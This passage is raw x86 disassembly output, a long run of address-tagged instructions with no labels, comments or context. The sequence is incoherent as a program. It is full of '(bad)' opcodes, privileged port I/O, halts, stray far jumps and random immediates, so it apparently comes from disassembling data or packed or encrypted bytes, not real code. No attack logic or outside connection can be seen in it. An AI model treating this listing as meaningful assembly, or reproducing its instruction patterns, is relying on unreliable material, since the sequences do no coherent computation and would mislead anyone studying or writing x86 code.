  439f16:	repz cmp DWORD PTR [ebx+0x2b],ecx
  439f1a:	adc    al,0x2e
  439f1c:	pop    edi
  439f1d:	aaa    
  439f1e:	xchg   ebx,eax
  439f1f:	jg     0x439eda
  439f21:	pop    edi
  439f22:	jg     0x439eac
  439f24:	mov    ?,WORD PTR [edx]
  439f26:	mov    edi,0xec6146ef
  439f2b:	stc    
  439f2c:	xchg   esp,eax
  439f2d:	loopne 0x439eca
  439f2f:	retf   
  439f30:	data16 mov ah,0xee
  439f33:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  439f35:	jne    0x439f47
  439f37:	jo     0x439f9e
  439f39:	or     DWORD PTR [ebp+0x71f82a0],edi
  439f3f:	mov    esi,0x616a3171
  439f44:	and    ch,BYTE PTR [eax+0x3d81a191]
  439f4a:	mov    esp,0xed3a6c04
  439f4f:	lea    esp,[esi]
  439f51:	lods   al,BYTE PTR ds:[esi]
  439f52:	mov    eax,es:0x7f46156d
  439f58:	add    dh,ch
  439f5a:	out    dx,al
  439f5b:	fwait
  439f5c:	ror    BYTE PTR [eax],1
  439f5e:	xor    eax,0x89df432f
  439f63:	lahf   
  439f64:	xor    ebp,DWORD PTR [edx+ebp*4+0x7c]
  439f68:	repz mov al,ds:0xcca44509
  439f6e:	adc    al,0x79
  439f70:	pop    esi
  439f71:	rcr    ebp,1
  439f73:	ins    BYTE PTR es:[edi],dx
  439f74:	mov    ds,esp
  439f76:	sub    al,0x91
  439f78:	outs   dx,BYTE PTR ds:[esi]
  439f79:	mov    al,ds:0x8673ee4e
  439f7e:	adc    ecx,edx
  439f80:	test   DWORD PTR [eax-0x637bdcc5],esi
  439f86:	pop    ds
  439f87:	in     al,dx
  439f88:	daa    
  439f89:	popa   
  439f8a:	push   edi
  439f8b:	in     eax,0x6a
  439f8d:	inc    ecx
  439f8e:	shr    DWORD PTR [ebx-0x289dbac1],cl
  439f94:	leave  
  439f95:	and    ch,dh
  439f97:	cli    
  439f98:	inc    ebp
  439f99:	cwde   
  439f9a:	xchg   ecx,eax
  439f9b:	inc    ebx
  439f9c:	pop    esi
  439f9d:	mov    bh,0xfd
  439f9f:	mul    DWORD PTR [esi-0x6c]
  439fa2:	repz ss pop ebx
  439fa5:	popa   
  439fa6:	leave  
  439fa7:	mov    ebp,0x74a6cdc5
  439fac:	xchg   esi,eax
  439fad:	mov    ebx,0x505dc6ee
  439fb2:	xchg   ecx,eax
  439fb3:	cmp    ebx,0xf2ee0bf0
  439fb9:	pusha  
  439fba:	sub    ah,dl
  439fbc:	(bad)  
  439fbd:	retf   0x2546
  439fc0:	das    
  439fc1:	fstp   DWORD PTR es:[ecx+0x63]
  439fc5:	pusha  
  439fc6:	outs   dx,BYTE PTR ds:[esi]
  439fc7:	jo     0x43a042
  439fc9:	inc    eax
  439fca:	or     al,0x0
  439fcc:	adc    ebp,DWORD PTR [esp+esi*8]
  439fcf:	mov    al,ds:0xfb95bc84
  439fd4:	lods   al,BYTE PTR ds:[esi]
  439fd5:	dec    edx
  439fd6:	leave  
  439fd7:	rcl    DWORD PTR [edx-0x2e],1
  439fda:	jno    0x43a000
  439fdc:	fiadd  WORD PTR [esi+0xc]
  439fdf:	add    esp,DWORD PTR [esi-0x7136a5f0]
  439fe5:	push   ebp
  439fe6:	out    dx,al
  439fe7:	jno    0x43a008
  439fe9:	jns    0x439fa5
  439feb:	sub    esp,DWORD PTR [edx-0x5b]
  439fee:	out    dx,al
  439fef:	dec    edi
  439ff0:	call   0xf97b:0x4091
  439ff6:	adc    eax,0x31f744a1
  439ffb:	icebp  
  439ffc:	nop
  439ffd:	fcom   DWORD PTR [edi+edi*8+0x5e]
  43a001:	stos   DWORD PTR es:[edi],eax
  43a002:	sti    
  43a003:	push   ds
  43a004:	cli    
  43a005:	jecxz  0x43a039
  43a007:	dec    ebx
  43a008:	jmp    0x43a02e
  43a00a:	in     eax,0xa0
  43a00c:	jmp    0xb6b6:0xf8098858
  43a013:	aam    0x5e
  43a015:	cwde   
  43a016:	inc    ebp
  43a017:	dec    ecx
  43a018:	push   ds
  43a019:	mov    esp,0xe942422d
  43a01e:	ret    
  43a01f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a020:	and    al,0xdc
  43a022:	sub    esp,DWORD PTR [edi]
  43a024:	test   al,0x59
  43a026:	cmp    al,BYTE PTR [ecx-0x5e]
  43a029:	mov    edx,0xa5bec3d9
  43a02e:	stc    
  43a02f:	jg     0x43a08e
  43a031:	inc    eax
  43a032:	xchg   edi,eax
  43a033:	push   esi
  43a034:	fisub  DWORD PTR [edx-0x3e]
  43a037:	cld    
  43a038:	xchg   ebp,eax
  43a039:	jne    0x439fe9
  43a03b:	xor    al,BYTE PTR [ebp+0x62]
  43a03e:	repz mov ds:0xe14ec178,eax
  43a044:	and    bl,0x76
  43a047:	pop    ecx
  43a048:	cli    
  43a049:	enter  0xbbef,0xae
  43a04d:	push   0x6
  43a04f:	and    DWORD PTR [ebx],esi
  43a051:	into   
  43a052:	aad    0xdd
  43a054:	int    0x60
  43a056:	in     al,0xc6
  43a058:	out    dx,eax
  43a059:	mov    ecx,0x8f3d1a85
  43a05e:	out    dx,al
  43a05f:	fmul   QWORD PTR [ebx]
  43a061:	xor    eax,0x9a69e3a3
  43a066:	pop    esp
  43a067:	add    ebx,0x60
  43a06a:	or     bl,BYTE PTR ds:0x6cc7f3e4
  43a070:	inc    esi
  43a071:	cld    
  43a072:	out    dx,al
  43a073:	nop
  43a074:	hlt    
  43a075:	push   cs
  43a076:	sub    ah,BYTE PTR [esi-0x5f23021a]
  43a07c:	repnz aad 0xed
  43a07f:	out    0xa9,eax
  43a081:	call   0x66a29a45
  43a086:	clc    
  43a087:	pop    ss
  43a088:	shl    DWORD PTR [edi+0x5ff72afc],cl
  43a08e:	iret   
  43a08f:	mov    bh,0xb0
  43a091:	in     eax,dx
  43a092:	xchg   ecx,eax
  43a093:	(bad)  
  43a094:	fwait
  43a095:	mov    WORD PTR [eax],cs
  43a097:	cld    
  43a098:	pop    esi
  43a099:	bound  edx,QWORD PTR [esp+ecx*1-0x1b]
  43a09d:	jb     0x43a0a0
  43a09f:	leave  
  43a0a0:	lods   eax,DWORD PTR ds:[esi]
  43a0a1:	pop    ebp
  43a0a2:	aam    0x2b
  43a0a4:	aas    
  43a0a5:	dec    esp
  43a0a6:	js     0x43a078
  43a0a8:	mov    esi,0x5e5c6cc7
  43a0ad:	pop    edx
  43a0ae:	push   ebx
  43a0af:	dec    ecx
  43a0b0:	mov    eax,ds:0x1c658f99
  43a0b5:	inc    edx
  43a0b6:	ds stos BYTE PTR es:[edi],al
  43a0b8:	nop
  43a0b9:	loopne 0x43a03d
  43a0bb:	xchg   ebx,eax
  43a0bc:	mov    ebx,0x535cbaea
  43a0c1:	and    ah,dh
  43a0c3:	add    al,0x8f
  43a0c5:	(bad)  
  43a0c7:	cwde   
  43a0c8:	repz adc BYTE PTR es:[ebx-0x2],ch
  43a0cd:	pop    ecx
  43a0ce:	mov    bl,0x9d
  43a0d0:	xor    esi,DWORD PTR [edi+0x1d]
  43a0d3:	xchg   ecx,eax
  43a0d4:	imul   BYTE PTR [ebx-0x60a17e91]
  43a0da:	cmp    eax,0xbbfe9318
  43a0df:	gs adc eax,0x9efc5a61
  43a0e5:	or     al,0x51
  43a0e7:	xchg   esi,eax
  43a0e8:	lods   eax,DWORD PTR ds:[esi]
  43a0e9:	push   ds
  43a0ea:	out    dx,al
  43a0eb:	and    bh,BYTE PTR [eax]
  43a0ed:	es adc eax,0xd1be253
  43a0f3:	mov    eax,ds:0x86aabde1
  43a0f8:	dec    edi
  43a0f9:	call   0xd3782b4f
  43a0fe:	imul   esp,DWORD PTR [ecx],0x9e6aab68
  43a104:	pop    eax
  43a105:	jne    0x43a157
  43a107:	in     eax,dx
  43a108:	push   esi
  43a109:	popa   
  43a10a:	cmp    eax,0x55dd9fae
  43a10f:	rcr    DWORD PTR [ebp+ebx*1-0x58d39713],0xa8
  43a117:	push   cs
  43a118:	or     al,0x32
  43a11a:	or     eax,0x56ad699d
  43a11f:	stos   DWORD PTR es:[edi],eax
  43a120:	push   0x5f
  43a122:	adc    dl,ch
  43a124:	dec    esp
  43a125:	and    BYTE PTR [ebx+ecx*2+0x7921c001],bl
  43a12c:	mov    ds:0xa492ee12,al
  43a131:	xchg   DWORD PTR [eax-0x2c],esi
  43a134:	pop    ebx
  43a135:	add    DWORD PTR [eax-0x5f],esi
  43a138:	inc    esi
  43a139:	cmp    BYTE PTR [eax+0x5e],ch
  43a13c:	test   al,0x68
  43a13e:	mov    ah,0x96
  43a140:	inc    esp
  43a141:	jl     0x43a1a5
  43a143:	jge    0x43a1a3
  43a145:	int    0x51
  43a147:	sub    al,0xaf
  43a149:	inc    edi
  43a14a:	dec    esi
  43a14b:	mov    eax,ds:0x539d2563
  43a150:	mov    esp,0x5e68e1be
  43a155:	nop
  43a156:	test   eax,0xca135aca
  43a15b:	jmp    0x51d2:0x7ab62f08
  43a162:	mov    bh,0x65
  43a164:	call   0x5d69065
  43a169:	sbb    DWORD PTR [esi-0x5b91a085],0x6c4df90e
  43a173:	or     esp,eax
  43a175:	lea    ecx,[eax+ecx*4+0x2e]
  43a179:	sub    cl,BYTE PTR [ecx+eiz*4]
  43a17c:	mov    BYTE PTR gs:[edi+edx*8+0x2],bl
  43a181:	mov    bl,0x5a
  43a183:	cmp    al,0x60
  43a185:	stc    
  43a186:	jo     0x43a1af
  43a188:	hlt    
  43a189:	sbb    esi,DWORD PTR [eax+ebx*2]
  43a18c:	jle    0x43a1de
  43a18e:	(bad)  
  43a18f:	mov    DWORD PTR [edi-0x1b],ebx
  43a192:	mov    WORD PTR [eax],fs
  43a194:	lea    esp,[edi]
  43a196:	xor    eax,0xd743b619
  43a19b:	mov    al,ds:0x671fa5e2
  43a1a0:	imul   eax,DWORD PTR [ebx],0x73
  43a1a3:	cmp    DWORD PTR [ebp*2-0x3aa10901],0xffffffdf
  43a1ab:	(bad)
  43a1af:	mov    eax,ds:0x279d3885
  43a1b4:	int3   
  43a1b5:	push   ebp
  43a1b6:	sub    BYTE PTR [ebx],0xea
  43a1b9:	xor    eax,0xdfd8aeee
  43a1be:	mov    ecx,DWORD PTR ds:0xa1016f19
  43a1c4:	jp     0x43a15f
  43a1c6:	push   es
  43a1c7:	cmp    DWORD PTR [ecx+0x5e],eax
  43a1ca:	xor    ecx,DWORD PTR [esi]
  43a1cc:	pop    esi
  43a1cd:	out    0xe3,al
  43a1cf:	iret   
  43a1d0:	mov    edx,0x2b554161
  43a1d5:	pop    ebp
  43a1d6:	xor    al,0xda
  43a1d8:	push   cs
  43a1d9:	fadd   DWORD PTR [eax+0x21]
  43a1dc:	fucomp st(7)
  43a1de:	mov    ah,0xf5
  43a1e0:	push   ecx
  43a1e1:	in     al,dx
  43a1e2:	mov    bh,0x67
  43a1e4:	lahf   
  43a1e5:	mov    eax,ds:0xa0933990
  43a1ea:	cmp    edi,DWORD PTR [ecx-0x6f81bae1]
  43a1f0:	pop    edx
  43a1f1:	loope  0x43a200
  43a1f3:	pusha  
  43a1f4:	pop    edi
  43a1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a1f6:	lahf   
  43a1f7:	or     eax,0x75db9a65
  43a1fc:	add    ebx,esi
  43a1fe:	fst    DWORD PTR [ebp-0xe950eb3]
  43a204:	mul    DWORD PTR [ecx+0x41]
  43a207:	inc    ebx
  43a208:	fidivr WORD PTR [ebp-0x3f]
  43a20b:	sbb    DWORD PTR [ecx],0x7a642af0
  43a211:	or     dh,ch
  43a213:	mov    bh,ah
  43a215:	test   BYTE PTR [esi-0x1288b289],ah
  43a21b:	mov    al,ds:0x5eb47b57
  43a220:	ret    0x6885
  43a223:	dec    esi
  43a224:	pop    ebp
  43a225:	mov    bh,bh
  43a227:	sbb    DWORD PTR ss:[edx],esi
  43a22a:	or     al,0x44
  43a22c:	push   0xffffffec
  43a22e:	push   ebp
  43a22f:	mov    eax,ds:0x5dc7fd0e
  43a234:	inc    esi
  43a235:	das    
  43a236:	inc    edx
  43a237:	pop    eax
  43a238:	pop    ebp
  43a239:	sbb    BYTE PTR [ebx],al
  43a23b:	and    BYTE PTR [bx],al
  43a23e:	jle    0x43a230
  43a240:	xchg   BYTE PTR [ecx+0x25],ah
  43a243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a244:	in     eax,0x4c
  43a246:	sub    eax,0x4d26e35b
  43a24b:	mov    edi,0x9938852d
  43a250:	fs pop edi
  43a252:	ret    
  43a253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a254:	xor    al,0x21
  43a256:	jae    0x43a1f4
  43a258:	retf   0x696c
  43a25b:	mov    eax,ds:0x84b731fd
  43a260:	(bad)  
  43a261:	arpl   WORD PTR [edx+0x17],dx
  43a264:	inc    esp
  43a265:	ror    DWORD PTR [edx],cl
  43a267:	mov    ecx,0x5a8caa5a
  43a26c:	fild   WORD PTR [eax+0x13]
  43a26f:	imul   ebp,DWORD PTR [esi-0x295ede6d],0x2de6efae
  43a279:	aam    0x93
  43a27b:	jo     0x43a2d8
  43a27d:	ror    BYTE PTR [esi+0x7b],0x3f
  43a281:	loopne 0x43a261
  43a283:	imul   eax,ebx,0x7ca15e47
  43a289:	das    
  43a28a:	mov    ?,WORD PTR [ecx-0x74b86218]
  43a290:	fs jge 0x43a244
  43a293:	adc    al,0x51
  43a295:	mov    eax,ds:0x9ca69257
  43a29a:	jge    0x43a22b
  43a29c:	sub    BYTE PTR [ebp+0x4d],0x50
  43a2a0:	mov    edx,0x2cbc4560
  43a2a5:	push   esp
  43a2a6:	test   BYTE PTR [esi+ebx*2],ch
  43a2a9:	(bad)  
  43a2aa:	in     eax,0xab
  43a2ac:	jmp    FWORD PTR ds:0x612a39f2
  43a2b2:	pop    edi
  43a2b3:	arpl   WORD PTR [eax-0x3e80556c],bx
  43a2b9:	fwait
  43a2ba:	out    dx,al
  43a2bb:	pusha  
  43a2bc:	fmul   QWORD PTR [ecx+0x1e45a0]
  43a2c2:	cmp    eax,0x760f59a0
  43a2c7:	shl    DWORD PTR [edx],1
  43a2c9:	loope  0x43a2a2
  43a2cb:	jne    0x43a284
  43a2cd:	in     al,dx
  43a2ce:	fstp   DWORD PTR [esi]
  43a2d0:	pop    esi
  43a2d1:	add    ebp,edx
  43a2d3:	std    
  43a2d4:	mov    ds:0xff50e9e0,al
  43a2d9:	pusha  
  43a2da:	rol    DWORD PTR [esi],cl
  43a2dc:	cwde   
  43a2dd:	and    BYTE PTR [ecx],0x72
  43a2e0:	sbb    DWORD PTR [edx],esp
  43a2e2:	fsubr  DWORD PTR [edx]
  43a2e4:	pop    esi
  43a2e5:	fstp   DWORD PTR [ecx+0x35]
  43a2e8:	cmp    dl,BYTE PTR [eax+0x26]
  43a2eb:	test   al,0xb3
  43a2ed:	push   ecx
  43a2ee:	xor    ebx,DWORD PTR [esi]
  43a2f0:	or     al,0x5
  43a2f2:	out    dx,al
  43a2f3:	mov    esi,0x916349a8
  43a2f8:	pop    esi
  43a2f9:	push   edx
  43a2fa:	call   0x97bc1239
  43a2ff:	mov    ah,0xa0
  43a301:	pusha  
  43a302:	imul   ebx,DWORD PTR [ebx+0x2aa867e5],0xffffffef
  43a309:	lahf   
  43a30a:	out    dx,al
  43a30b:	in     eax,dx
  43a30c:	sub    DWORD PTR [edi-0x48],eax
  43a30f:	sub    al,0x3b
  43a311:	loope  0x43a336
  43a313:	mov    eax,ds:0x39d3eced
  43a318:	stos   DWORD PTR es:[edi],eax
  43a319:	sbb    esi,DWORD PTR [ebp-0x73]
  43a31c:	pop    esi
  43a31d:	lods   eax,DWORD PTR ds:[esi]
  43a31e:	or     al,0x7f
  43a320:	fisttp WORD PTR [ebx-0x54]
  43a323:	sbb    al,0xcd
  43a325:	pusha  
  43a326:	dec    ebx
  43a327:	dec    eax
  43a328:	add    BYTE PTR [edi+0x3fc08ac7],bl
  43a32e:	out    dx,al
  43a32f:	lds    ebp,FWORD PTR ds:0x95bfa3bf
  43a335:	enter  0xa143,0xcb
  43a339:	bound  edi,QWORD PTR [eax+0x50]
  43a33c:	add    BYTE PTR [ecx+0x47],ch
  43a33f:	(bad)  
  43a340:	scas   al,BYTE PTR es:[edi]
  43a341:	sub    dh,ch
  43a343:	cmp    al,0x54
  43a345:	push   esp
  43a346:	jmp    0xf1a1:0x3b4f0601
  43a34d:	mov    edx,DWORD PTR [esi-0x51]
  43a350:	pop    eax
  43a351:	jns    0x43a342
  43a353:	push   0x51
  43a355:	pop    eax
  43a356:	mov    BYTE PTR [edx+0x72],dl
  43a359:	loopne 0x43a36e
  43a35b:	xchg   edx,eax
  43a35c:	repnz test al,0x6e
  43a35f:	pop    ds
  43a360:	stc    
  43a361:	push   edx
  43a362:	repz mov ecx,0xaaeef5b4
  43a368:	mov    edx,0x5df80cd5
  43a36d:	cmp    ebx,DWORD PTR [ecx]
  43a36f:	jo     0x43a3bd
  43a371:	and    eax,0xd98f114c
  43a376:	outs   dx,BYTE PTR ds:[esi]
  43a377:	sti    
  43a378:	div    BYTE PTR [ecx-0x52f90f73]
  43a37e:	out    dx,eax
  43a37f:	jle    0x43a3ac
  43a381:	push   edx
  43a382:	xchg   DWORD PTR [eax+0x51ed6653],ebx
  43a388:	div    ebp
  43a38a:	inc    ecx
  43a38b:	in     al,dx
  43a38c:	mov    esi,0xeda18a6a
  43a391:	jl     0x43a40c
  43a393:	xchg   BYTE PTR [edi+0x77],cl
  43a396:	sub    BYTE PTR [ebp+0x64],bh
  43a399:	jbe    0x43a392
  43a39b:	cmp    al,0x80
  43a39d:	inc    eax
  43a39e:	mov    ds:0xfc1b98a8,eax
  43a3a3:	mov    al,ds:0x30dbfac1
  43a3a8:	pop    ss
  43a3a9:	or     BYTE PTR [eax-0x6bcca1f5],dh
  43a3af:	inc    ebp
  43a3b0:	jmp    0x43a366
  43a3b2:	or     BYTE PTR [eax-0x3d],0x60
  43a3b6:	ins    BYTE PTR es:[edi],dx
  43a3b7:	scas   eax,DWORD PTR es:[edi]
  43a3b8:	add    eax,ebx
  43a3ba:	mov    DWORD PTR [ebp-0x2811c2d5],ebx
  43a3c0:	push   cs
  43a3c1:	dec    eax
  43a3c2:	xlat   BYTE PTR ds:[ebx]
  43a3c3:	cdq    
  43a3c4:	ja     0x43a38e
  43a3c6:	fwait
  43a3c7:	jno    0x43a384
  43a3c9:	pop    ecx
  43a3ca:	daa    
  43a3cb:	fwait
  43a3cc:	xor    DWORD PTR [edx+esi*2],esi
  43a3cf:	shl    DWORD PTR [esi+0x5ef14628],0x59
  43a3d6:	and    BYTE PTR [ebp-0x26],bl
  43a3d9:	pop    ds
  43a3da:	pop    esi
  43a3db:	or     al,0xd4
  43a3dd:	pusha  
  43a3de:	sahf   
  43a3df:	pop    ss
  43a3e0:	in     eax,dx
  43a3e1:	mov    edi,0x26a7505b
  43a3e6:	push   esi
  43a3e7:	jae    0x43a447
  43a3e9:	iret   
  43a3ea:	or     ecx,DWORD PTR [ecx]
  43a3ec:	mov    ebx,0x6c72851
  43a3f1:	gs nop
  43a3f3:	add    BYTE PTR [ebp-0x42],bl
  43a3f6:	xchg   esp,eax
  43a3f7:	mov    cl,0x9f
  43a3f9:	cli    
  43a3fa:	jecxz  0x43a450
  43a3fc:	mov    bh,ah
  43a3fe:	out    0x84,eax
  43a400:	jbe    0x43a3d5
  43a402:	fmul   DWORD PTR [edi]
  43a404:	push   cs
  43a405:	mov    dh,0x7e
  43a407:	add    BYTE PTR [esi+0x57a47b2d],bl
  43a40d:	enter  0x1ce5,0x75
  43a411:	imul   eax,DWORD PTR [esi-0x7d],0x59
  43a415:	pop    ss
  43a416:	in     al,dx
  43a417:	ss vcmpps xmm6,xmm3,xmm7,0xc2
  43a41d:	mov    esi,0x932460c1
  43a422:	mov    ch,0xa0
  43a424:	iret   
  43a425:	or     al,0x84
  43a427:	pushf  
  43a428:	push   ss
  43a429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a42a:	shr    ebp,1
  43a42c:	pop    esi
  43a42d:	fidivr DWORD PTR [ecx+ebp*2+0x2a49765d]
  43a434:	lahf   
  43a435:	bound  edi,QWORD PTR [eax+0x3042debc]
  43a43b:	in     eax,0x8c
  43a43d:	xor    eax,DWORD PTR [ecx+eax*1+0x4eccd13c]
  43a444:	arpl   cx,bp
  43a446:	mov    cl,0xc0
  43a448:	fldcw  WORD PTR [ebx+0x68]
  43a44b:	push   esi
  43a44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a44d:	pusha  
  43a44e:	clc    
  43a44f:	mov    cl,0x1e
  43a451:	xor    eax,0x17ed650e
  43a456:	lock push ecx
  43a458:	or     edx,DWORD PTR [ebp+0x4e]
  43a45b:	add    DWORD PTR [eax-0x76],ebp
  43a45e:	add    BYTE PTR [ecx],bh
  43a460:	mov    edx,0xdec02d63
  43a465:	sub    dl,BYTE PTR [ebp+0x59e0b244]
  43a46b:	pusha  
  43a46c:	pop    esi
  43a46d:	add    eax,ebx
  43a46f:	inc    eax
  43a470:	inc    edx
  43a471:	pop    ecx
  43a472:	add    esi,ecx
  43a474:	test   al,0x0
  43a476:	lock lds ebx,FWORD PTR fs:[ebp+0x35]
  43a47b:	inc    esi
  43a47c:	mov    esi,DWORD PTR [ebp+0x2ccea4fd]
  43a482:	lea    ebx,gs:[esi+0x42]
  43a486:	pop    ds
  43a487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a488:	aas    
  43a489:	cmp    al,0xc2
  43a48b:	iret   
  43a48c:	(bad)  [eax+0x5b]
  43a48f:	or     al,0xed
  43a491:	jg     0x43a4e4
  43a493:	cmc    
  43a494:	out    dx,eax
  43a495:	std    
  43a496:	out    0x2d,eax
  43a498:	adc    DWORD PTR [ecx+ecx*1-0x2127c173],eax
  43a49f:	retf   0x60d0
  43a4a2:	pop    ebx
  43a4a3:	test   DWORD PTR [edx-0x7f56476d],esi
  43a4a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a4aa:	out    dx,al
  43a4ab:	xchg   edx,eax
  43a4ac:	dec    ecx
  43a4ad:	push   esp
  43a4ae:	jo     0x43a52d
  43a4b0:	adc    BYTE PTR [eax+0x51caacca],dh
  43a4b6:	jg     0x43a478
  43a4b8:	jno    0x43a497
  43a4ba:	scas   al,BYTE PTR es:[edi]
  43a4bb:	xchg   BYTE PTR [ecx],dl
  43a4bd:	jecxz  0x43a45d
  43a4bf:	retf   0xb866
  43a4c2:	out    dx,al
  43a4c3:	jb     0x43a460
  43a4c5:	pop    ecx
  43a4c6:	int3   
  43a4c7:	sub    ecx,DWORD PTR ds:0x16a13cc3
  43a4cd:	add    dh,bh
  43a4cf:	test   eax,0x66906c20
  43a4d4:	pop    esi
  43a4d5:	mov    edi,0x4f046c98
  43a4da:	stos   DWORD PTR es:[edi],eax
  43a4db:	or     al,0x53
  43a4dd:	popa   
  43a4de:	inc    esi
  43a4df:	sub    BYTE PTR [edi+0x1a0fa],bh
  43a4e5:	mov    ebx,0x8b207fee
  43a4ea:	add    eax,0x70390546
  43a4ef:	lock aam 0x60
  43a4f2:	je     0x43a49d
  43a4f4:	push   0xffffffe8
  43a4f6:	test   DWORD PTR [esi],eax
  43a4f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a4f9:	fwait
  43a4fa:	out    dx,al
  43a4fb:	mov    ah,0xd6
  43a4fd:	gs mov ch,0xff
  43a500:	dec    esp
  43a501:	sbb    DWORD PTR [edi-0x220d1c70],eax
  43a507:	mov    al,ds:0x9f5c9173
  43a50c:	adc    eax,0x90c6eec0
  43a511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a512:	stos   DWORD PTR es:[edi],eax
  43a513:	es push 0x93f36dc6
  43a519:	pusha  
  43a51a:	repz mov eax,ds:0xe757c174
  43a520:	scas   al,BYTE PTR es:[edi]
  43a521:	aaa    
  43a522:	out    dx,al
  43a523:	pop    edx
  43a524:	mov    ebx,DWORD PTR [ebp-0x2f]
  43a527:	jnp    0x43a4cc
  43a529:	lods   eax,DWORD PTR ds:[esi]
  43a52a:	or     cl,BYTE PTR [esi-0x1cbdb455]
  43a530:	test   DWORD PTR [ebp+0x399ef132],0xbc75263d
  43a53a:	xchg   DWORD PTR [ebp+0x5e],esi
  43a53d:	bnd jnp 0x43a5be
  43a540:	cmp    eax,DWORD PTR [ebx-0x44]
  43a543:	fsubr  QWORD PTR [ecx+eiz*2]
  43a546:	xchg   esp,eax
  43a547:	dec    BYTE PTR [ebx+0x65]
  43a54a:	push   ebp
  43a54b:	xor    ch,BYTE PTR [ebx]
  43a54d:	or     DWORD PTR [esi-0x6b],edi
  43a550:	test   dl,bh
  43a552:	out    dx,al
  43a553:	loopne 0x43a504
  43a555:	out    0xdc,al
  43a557:	ja     0x43a4d9
  43a559:	(bad)  
  43a55a:	or     esp,DWORD PTR [ecx-0xdf4e46]
  43a560:	addr16 adc bl,dh
  43a563:	sbb    al,0xec
  43a565:	sub    ebp,esi
  43a567:	xchg   ecx,eax
  43a568:	xchg   esp,eax
  43a569:	ss and al,0xbd
  43a56c:	jbe    0x43a50f
  43a56e:	adc    eax,0x7dddcaa8
  43a573:	sub    edi,DWORD PTR es:[esi]
  43a576:	in     eax,0xac
  43a578:	scas   al,BYTE PTR es:[edi]
  43a579:	jp     0x43a56f
  43a57b:	popf   
  43a57c:	pop    esi
  43a57d:	fnstsw WORD PTR [ebx-0x8]
  43a580:	dec    BYTE PTR [esi+0x38]
  43a583:	cmp    edx,DWORD PTR [ebx+0x46af4b51]
  43a589:	dec    edx
  43a58a:	jb     0xc19b286e
  43a590:	mov    edx,0x21fee9e
  43a595:	js     0x43a613
  43a597:	daa    
  43a598:	xchg   DWORD PTR [edi-0x16],edi
  43a59b:	mov    al,ds:0xc83d0478
  43a5a0:	mov    ds:0xeaefccfa,eax
  43a5a5:	jge    0x43a595
  43a5a7:	cli    
  43a5a8:	addr16 dec esp
  43a5aa:	add    ebx,DWORD PTR [ecx-0xdc6d8cf]
  43a5b0:	sbb    edx,DWORD PTR [ebx+0x3d]
  43a5b3:	stos   DWORD PTR es:[edi],eax
  43a5b4:	xchg   DWORD PTR [esi-0x12],eax
  43a5b7:	inc    ebx
  43a5b8:	or     DWORD PTR [ecx-0x7e],esi
  43a5bb:	sub    esp,DWORD PTR [ebx-0x65]
  43a5be:	sub    dl,BYTE PTR [eax-0x4033a238]
  43a5c4:	fs leave 
  43a5c6:	and    BYTE PTR [ecx+0x4d],ah
  43a5c9:	leave  
  43a5ca:	mov    ecx,0xe3b86b9f
  43a5cf:	add    edi,DWORD PTR [esi-0x237940f2]
  43a5d5:	lods   eax,DWORD PTR ds:[esi]
  43a5d6:	dec    edx
  43a5d7:	sub    eax,0x9bae175e
  43a5dc:	add    DWORD PTR [ebx-0x6d],0xffffffa3
  43a5e0:	cli    
  43a5e1:	pop    ecx
  43a5e2:	and    eax,0xcbf92369
  43a5e7:	xor    ecx,eax
  43a5e9:	nop
  43a5ea:	xlat   BYTE PTR ds:[ebx]
  43a5eb:	dec    esp
  43a5ec:	ret    
  43a5ed:	shr    ch,cl
  43a5ef:	xlat   BYTE PTR ds:[ebx]
  43a5f0:	xchg   ebx,eax
  43a5f1:	sti    
  43a5f2:	jne    0x43a5d0
  43a5f4:	jno    0x6169dec8
  43a5fa:	xor    DWORD PTR [ecx],0xffffffbb
  43a5fd:	jge    0x43a650
  43a5ff:	or     eax,0xcbeee2ba
  43a604:	fwait
  43a605:	scas   al,BYTE PTR es:[edi]
  43a606:	push   es
  43a607:	mov    esp,DWORD PTR [edx]
  43a609:	mov    edi,0xc066a0d5
  43a60e:	(bad)  
  43a60f:	(bad)  
  43a610:	in     eax,0xd2
  43a612:	and    eax,0xa8245b7e
  43a617:	dec    eax
  43a618:	fst    QWORD PTR [edx+0x2e]
  43a61b:	ins    BYTE PTR es:[edi],dx
  43a61c:	adc    dh,BYTE PTR [edx+edx*8-0x60]
  43a620:	jno    0x43a68b
  43a622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a623:	idiv   bh
  43a625:	dec    eax
  43a626:	retf   0x5e1b
  43a629:	sub    eax,0xfebf9eaa
  43a62e:	sub    al,0xce
  43a630:	cmp    eax,0x88d9b361
  43a635:	sbb    dh,BYTE PTR [ebp+0x30]
  43a638:	loope  0x43a694
  43a63a:	out    dx,al
  43a63b:	cdq    
  43a63c:	adc    edi,DWORD PTR [eax+0x347859dc]
  43a642:	cdq    
  43a643:	mov    eax,ds:0x51e2b3ce
  43a648:	mov    edx,0x78f793f9
  43a64d:	dec    eax
  43a64e:	out    dx,al
  43a64f:	pop    edx
  43a650:	ret    
  43a651:	jae    0x43a607
  43a653:	call   0xa13863c4
  43a658:	pop    sp
  43a65a:	dec    ebp
  43a65b:	pop    edi
  43a65c:	pop    ds
  43a65d:	pop    edi
  43a65e:	xchg   edi,eax
  43a65f:	imul   ebx,DWORD PTR [esi-0x32],0xd401da3
  43a666:	sbb    DWORD PTR [ebx-0x72bb9b18],esi
  43a66c:	pusha  
  43a66d:	nop
  43a66e:	cs ins DWORD PTR es:[edi],dx
  43a670:	sbb    al,0xfc
  43a672:	into   
  43a673:	dec    edx
  43a674:	or     al,0x11
  43a676:	out    dx,al
  43a677:	mov    ebx,0x89005d04
  43a67c:	xchg   DWORD PTR [ebp+0x7911a185],ebx
  43a682:	mov    ah,0x8
  43a684:	fwait
  43a685:	out    0x1f,eax
  43a687:	xchg   ebx,eax
  43a688:	cmp    BYTE PTR [esi+ebp*8-0x1c],0xc8
  43a68d:	mov    edi,0x501e3092
